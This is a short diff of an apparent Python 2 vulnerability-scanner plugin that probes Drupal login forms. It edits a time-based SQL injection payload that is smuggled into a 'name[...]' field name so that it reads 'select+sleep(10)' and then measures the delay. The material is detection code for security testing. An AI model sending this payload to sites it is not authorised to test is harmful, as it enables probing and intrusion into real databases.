@@ -22,7 +22,7 @@ def Audit(services):
 				try:
 					url = services['url']
 					target = '%s/?q=node&destination=node' % url
-					post_data = "name[0%20;sleep(10);;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
+					post_data = "name[0%20;select+sleep(10);;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
 					start1 = time()
 					print 'start1:',start1
 					urllib2.urlopen(url=url).read()
